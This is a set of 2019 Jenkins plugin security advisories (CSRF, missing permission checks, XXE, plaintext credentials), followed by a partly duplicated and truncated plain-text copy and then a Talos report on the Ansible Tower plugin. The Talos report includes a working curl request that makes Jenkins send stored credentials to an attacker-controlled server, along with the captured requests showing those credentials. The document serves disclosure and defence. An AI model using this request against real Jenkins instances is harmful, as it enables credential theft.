## Descriptions

### CSRF vulnerability and missing permission check allowed changing default graph configuration in analysis-core Plugin

**SECURITY-1100
/
CVE-2019-10307 (CSRF) and CVE-2019-10308 (permission check)**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)

**Affected plugin:
[`analysis-core`](https://plugins.jenkins.io/analysis-core)**

**Description:**

analysis-core Plugin has the capability to allow other plugins to display trend graphs for their static analysis results.
analysis-core Plugin provides the configuration form for the default settings of each graph.

The configuration form and form submission handler did not perform a permission check, allowing attackers with Job/Read access to change the per-job graph configuration defaults for all users.

Additionally, the form submission handler did not require POST requests, resulting in a cross-site request forgery vulnerability.

analysis-core Plugin now requires Job/Configure permission and POST requests to configure the per-job graph defaults for all users.

### SiteMonitor Plugin globally and unconditionally disables SSL/TLS certificate validation

**SECURITY-930
/
CVE-2019-10317**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Affected plugin:
[`sitemonitor`](https://plugins.jenkins.io/sitemonitor)**

**Description:**

SiteMonitor Plugin unconditionally disables SSL/TLS certificate validation for the entire Jenkins controller JVM.

SiteMonitor Plugin no longer does that.
Instead, it now has an opt-in option to ignore SSL/TLS errors for each site check individually.

### XXE vulnerability via UDP broadcast response in Swarm Plugin client

**SECURITY-1252
/
CVE-2019-10309**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:L)

**Affected plugin:
[`swarm`](https://plugins.jenkins.io/swarm)**

**Description:**

Swarm Plugin allows clients to auto-discover Jenkins instances on the same network through a UDP discovery request.
Responses to this request are XML documents.

Swarm Plugin does not configure the XML parser in a way that would prevent XML External Entity (XXE) processing.
This allows unauthenticated attackers on the same network to have Swarm clients parse a maliciously crafted XML response that uses external entities to read arbitrary files from the Swarm client or denial-of-service attacks.

As of publication of this advisory, there is no fix.

### CSRF vulnerability and missing permission check in Ansible Tower Plugin allowed capturing credentials

**SECURITY-1355 (1)
/
CVE-2019-10310 (CSRF) and CVE-2019-10311 (permission check)**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N)

**Affected plugin:
[`ansible-tower`](https://plugins.jenkins.io/ansible-tower)**

**Description:**

Ansible Tower Plugin did not perform permission checks on a method implementing form validation.
This allowed users with Overall/Read access to Jenkins to connect to an attacker-specified URL using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins.

Additionally, this form validation method did not require POST requests, resulting in a cross-site request forgery vulnerability.

This form validation method now requires POST requests and Overall/Administer permissions.

### Users with Overall/Read access are able to enumerate credential IDs in Ansible Tower Plugin

**SECURITY-1355 (2)
/
CVE-2019-10312**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Affected plugin:
[`ansible-tower`](https://plugins.jenkins.io/ansible-tower)**

**Description:**

Ansible Tower Plugin provides a list of applicable credential IDs to allow users configuring the plugin to select the one to use.

This functionality did not check permissions, allowing any user with Overall/Read permission to get a list of valid credentials IDs.
Those could be used as part of an attack to capture the credentials using another vulnerability.

An enumeration of credentials IDs in this plugin now requires Overall/Administer permission.

### Microsoft Entra ID (previously Azure AD) Plugin stored credentials in plain text

**SECURITY-1390
/
CVE-2019-10318**

**Severity (CVSS):**
[Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Affected plugin:
[`azure-ad`](https://plugins.jenkins.io/azure-ad)**

**Description:**

Microsoft Entra ID (previously Azure AD) Plugin stored the client secret unencrypted in the global `config.xml` configuration file on the Jenkins controller.
These credentials could be viewed by users with access to the Jenkins controller file system.

Microsoft Entra ID (previously Azure AD) Plugin now stores the client secret encrypted.

### Twitter Plugin stores credentials in plain text

**SECURITY-1143
/
CVE-2019-10313**

**Severity (CVSS):**
[Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Affected plugin:
[`twitter`](https://plugins.jenkins.io/twitter)**

**Description:**

Twitter Plugin stores credentials unencrypted in its global configuration file on the Jenkins controller.
These credentials could be viewed by users with access to the Jenkins controller file system.

As of publication of this advisory, there is no fix.

### Koji Plugin globally and unconditionally disables SSL/TLS certificate validation

**SECURITY-936
/
CVE-2019-10314**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Affected plugin:
[`koji`](https://plugins.jenkins.io/koji)**

**Description:**

Koji Plugin unconditionally disables SSL/TLS certificate validation for the entire Jenkins controller JVM.

As of publication of this advisory, there is no fix.

### CSRF vulnerability in OAuth callback in GitHub Authentication Plugin

**SECURITY-443
/
CVE-2019-10315**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L)

**Affected plugin:
[`github-oauth`](https://plugins.jenkins.io/github-oauth)**

**Description:**

GitHub Authentication Plugin did not manage the state parameter of OAuth to prevent CSRF.
This allowed an attacker to catch the redirect URL provided during the authentication process using OAuth and send it to the victim.
If the victim was already connected to Jenkins, their Jenkins account would be attached to the attackerâ€™s GitHub account.

The state parameter is now correctly managed.

### Aqua MicroScanner Plugin stored credentials in plain text

**SECURITY-1380
/
CVE-2019-10316**

**Severity (CVSS):**
[Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Affected plugin:
[`aqua-microscanner`](https://plugins.jenkins.io/aqua-microscanner)**

**Description:**

Aqua MicroScanner Plugin stored credentials unencrypted in its global configuration file on the Jenkins controller.
These credentials could be viewed by users with access to the Jenkins controller file system.

Aqua MicroScanner Plugin now stores credentials encrypted.

SECURITY-1100 / CVE-2019-10307 (CSRF) and CVE-2019-10308 (permission check)
Static Analysis Utilities Plugin has the capability to allow other plugins to
display trend graphs for their static analysis results. Static Analysis
Utilities Plugin provides the configuration form for the default settings of
each graph.

The configuration form and form submission handler did not perform a
permission check, allowing attackers with Job/Read access to change the
per-job graph configuration defaults for all users.

Additionally, the form submission handler did not require POST requests,
resulting in a cross-site request forgery vulnerability.

Static Analysis Utilities Plugin now requires Job/Configure permission and
POST requests to configure the per-job graph defaults for all users.

SECURITY-930 / CVE-2019-10317

SECURITY-1252 / CVE-2019-10309
Self-Organizing Swarm Plug-in Modules Plugin allows clients to auto-discover
Jenkins instances on the same network through a UDP discovery request.
Responses to this request are XML documents.

Self-Organizing Swarm Plug-in Modules Plugin does not configure the XML parser
in a way that would prevent XML External Entity (XXE) processing. This allows
unauthenticated attackers on the same network to have Swarm clients parse a
maliciously crafted XML response that uses external entities to read arbitrary
files from the Swarm client or denial-of-service attacks.

As of publication of this advisory, there is no fix.

SECURITY-1355 (1) / CVE-2019-10310 (CSRF) and CVE-2019-10311 (permission check)

implementing form validation. This allowed users with Overall/Read access to
Jenkins to connect to an attacker-specified URL using attacker-specified
credentials IDs obtained through another method, capturing credentials stored
in Jenkins.

Additionally, this form validation method did not require POST requests,
resulting in a cross-site request forgery vulnerability.

This form validation method now requires POST requests and Overall/Administer
permissions.

SECURITY-1355 (2) / CVE-2019-10312
Ansible Tower Plugin provides a list of applicable credential IDs to allow
users configuring the plugin to select the one to use.

This functionality did not check permissions, allowing any user with
Overall/Read permission to get a list of valid credentials IDs. Those could be
used as part of an attack to capture the credentials using another

# Talos Vulnerability Report

### TALOS-2019-0786

## Jenkins Ansible Tower Plugin information disclosure vulnerability

##### May 6, 2019

##### CVE Number

CVE-2019-10310

### Summary

An exploitable information disclosure vulnerability exists in the `testTowerConnection` function of the Jenkins Ansible Tower Plugin 0.9.1. A specially crafted HTTP request from a user with Overall/Read permissions - such as an anonymous user, if enabled - can cause affected versions of this plugin to disclose credentials from the Jenkins credentials database to an attacker-controlled server. As this vulnerability is exploitable through HTTP GET request, this vulnerability may also be exploited via Cross Site Request Forgery (CSRF). In addition to the above, if the responding server does not return properly formatted JSON document, the response will be reflected to the user as part of the reported error resulting in an HTTP GET only Server Side Request Forgery (SSRF).

This vulnerability is also present in the `fillTowerCredentialsIdItems` endpoint exposed by this plugin, which allows for the enumeration of credentials identifiers required for this attack to be successful.

### Tested Versions

Jenkins Ansible Tower Plugin 0.9.1

### Product URLs

<https://github.com/jenkinsci/ansible-tower-plugin>
<https://plugins.jenkins.io/ansible-tower>

### CVSSv3 Score

7.7 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N

### CWE

CWE-285: Improper Authorization

### Details

Ansible an open-source software that allows users to configure and deploy various applications. The Ansible Tower plugin aims to make Ansible even more easy to use for IT teams of all kinds. This vulnerability exists in the `testTowerConnection` endpoint exposed by the `doTestTowerConnection` method of `org.jenkinsci.plugins.ansible_tower.util.TowerInstallation` due to missing Jenkins permissions check. The same missing permissions check also exists in the `doFillTowerCredentialsIdItems` method, which yields the ability to enumerate credentials.

Due to the way in which this plugin expects to authenticate against the remote Ansible Tower instance, the credentials associated with the attacker specified `towerCredentialsId` are base64-encoded and submitted as part of the HTTP `Authorization` header to the attacker-controlled server, and are also included plaintext in a JSON document submitted to the attacker specified endpoint. An example of this attack against a Jenkins 2.165 instance running a vulnerable version of this plugin and configured to allow anonymous read access has been provided below.

```

#Â Send credentials to an attacker's server (http://127.0.0.1:7000?).
# The trailing '?' is to ensure that the expected path is appended as a
# query parameter, rather than part of the query path.
#
# Two requests are performed by Jenkins here. The first is a 'ping', which
# requires that the target respond with a well formed JSON response -
# though any JSON response will do. If this first request fails, the reply
# will be reflected to the client (SSRF). If it succeeds, a subsequent
# POST will be performed which contains the credentials.
#
$ curl -s -X GET -G \
    -d 'towerURL=http://127.0.0.1:7000/report.json?' \
    -d 'towerTrustCert=false' \
    -d 'enableDebugging=true' \
    -d 'towerCredentialsId=287fcbe2-177e-4108-ac58-efdc0a507376' \
    'http://127.0.0.1:8080/jenkins/descriptorByName/org.jenkinsci.plugins.ansible_tower.util.TowerInstallation/testTowerConnection'

```

The request submitted by the plugin to the remote server as an HTTP GET, will appear similar to the following:

```
# First request from Jenkins (GET)
/report.json?/api/v2/ping/
Host: 127.0.0.1:7000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1-alpha1 (java 1.5)

# Second request from Jenkins (POST)
/report.json?/api/v2/authtoken/
Authorization: Basic U2VjdXJlVXNlcm5hbWU6U2VjdXJlUGFzc3dvcmRPaE5v
Content-Type: application/json
Content-Length: 61
Host: 127.0.0.1:7000
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1-alpha1 (java 1.5)

{"username":"SecureUsername","password":"SecurePasswordOhNo"}

```
### Mitigation

Until such time that the vendor produces a patched version, this plugin should be disabled (if possible), or unnecessary users with Overall/Read permissions removed (such as anonymous access).
